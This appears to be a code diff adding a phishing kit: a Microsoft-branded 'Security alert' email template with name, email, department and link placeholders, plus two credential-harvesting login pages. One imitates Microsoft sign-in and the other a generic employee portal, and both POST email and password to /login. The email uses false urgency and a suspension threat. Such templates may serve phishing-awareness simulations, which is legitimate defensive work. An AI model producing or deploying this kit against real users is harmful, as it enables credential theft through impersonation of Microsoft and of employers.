@@ -1,0 +1,333 @@
+=== EMAIL TEMPLATE (Microsoft) ===
+
+<div style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:600px;margin:0 auto;background:#f3f2f1;padding:40px 20px;">
+    <div style="background:white;padding:40px;border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,.14);">
+        <div style="text-align:center;margin-bottom:30px;">
+            <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><path fill="#f25022" d="M0 0h11.377v11.377H0z"/><path fill="#00a4ef" d="M12.623 0H24v11.377H12.623z"/><path fill="#7fba00" d="M0 12.623h11.377V24H0z"/><path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/></svg>
+            <h2 style="margin:20px 0 0;color:#323130;font-size:28px;font-weight:600;">Microsoft</h2>
+        </div>
+        
+        <h3 style="color:#323130;font-size:20px;margin:0 0 20px;">Security alert</h3>
+        
+        <p style="color:#323130;line-height:1.6;margin:0 0 20px;">Hi {{name}},</p>
+        
+        <p style="color:#323130;line-height:1.6;margin:0 0 20px;">We detected unusual sign-in activity on your Microsoft account <strong>{{email}}</strong> from the {{department}} network.</p>
+        
+        <div style="background:#fff4ce;border-left:3px solid #ffb900;padding:16px;margin:24px 0;">
+            <p style="margin:0;color:#323130;font-weight:600;">Action required within 24 hours</p>
+            <p style="margin:8px 0 0;color:#605e5c;font-size:14px;">Verify your identity to prevent account suspension.</p>
+        </div>
+        
+        <div style="text-align:center;margin:30px 0;">
+            <a href="{{landing_url}}" style="display:inline-block;background:#0078d4;color:white;padding:14px 32px;text-decoration:none;border-radius:2px;font-weight:600;font-size:15px;">Verify Account</a>
+        </div>
+        
+        <p style="color:#605e5c;font-size:13px;line-height:1.6;margin:30px 0 0;padding-top:20px;border-top:1px solid #edebe9;">
+            This is an automated message from Microsoft account security. If you didn't request this, please contact your IT administrator.
+        </p>
+        
+        <p style="color:#a19f9d;font-size:12px;margin:10px 0 0;">
+            Microsoft Corporation | One Microsoft Way | Redmond, WA 98052
+        </p>
+    </div>
+</div>
+
+
+=== LANDING PAGE (Microsoft) ===
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #323130;
+        }
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            background: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,.2);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo svg {
+            width: 108px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #323130;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #605e5c;
+            margin-bottom: 24px;
+        }
+        .alert {
+            background: #fff4ce;
+            border-left: 3px solid #ffb900;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #323130;
+        }
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #323130;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            font-size: 15px;
+            margin-bottom: 20px;
+            transition: border-color 0.15s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            border-width: 2px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        button:hover {
+            background: #106ebe;
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 13px;
+            color: #605e5c;
+        }
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#f25022" d="M0 0h11.377v11.377H0z"/>
+                <path fill="#00a4ef" d="M12.623 0H24v11.377H12.623z"/>
+                <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
+                <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
+            </svg>
+        </div>
+        
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Microsoft Account</p>
+        
+        <div class="alert">
+            <strong>Security verification required</strong><br>
+            Unusual activity detected. Please verify your credentials.
+        </div>
+        
+        <form method="POST" action="/login">
+            <label>Email or phone</label>
+            <input type="email" name="email" required autofocus>
+            
+            <label>Password</label>
+            <input type="password" name="password" required>
+            
+            <button type="submit">Sign in</button>
+        </form>
+        
+        <div class="footer">
+            <a href="#">Can't access your account?</a> • 
+            <a href="#">Privacy</a> • 
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
+
+
+=== LANDING PAGE (Generic Corporate Portal) ===
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Portal - Authentication Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,.3);
+            width: 100%;
+            max-width: 420px;
+            padding: 48px 40px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 28px;
+            color: #1a202c;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #718096;
+            font-size: 14px;
+        }
+        .notice {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 16px;
+            margin-bottom: 28px;
+            border-radius: 4px;
+        }
+        .notice-title {
+            font-weight: 600;
+            color: #92400e;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+        .notice-text {
+            color: #b45309;
+            font-size: 13px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+        }
+        .footer-links {
+            font-size: 13px;
+            color: #6b7280;
+        }
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <div class="logo">🔐</div>
+            <h1>Employee Portal</h1>
+            <p class="subtitle">Secure access authentication</p>
+        </div>
+        
+        <div class="notice">
+            <div class="notice-title">Session Expired</div>
+            <div class="notice-text">Your session has timed out due to inactivity. Please re-enter your credentials.</div>
+        </div>
+        
+        <form method="POST" action="/login">
+            <div class="form-group">
+                <label for="email">Work Email</label>
+                <input type="email" id="email" name="email" placeholder="your.name@company.com" required autofocus>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <button type="submit">Sign In Securely</button>
+        </form>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Forgot Password?</a> • 
+                <a href="#">Help</a> • 
+                <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
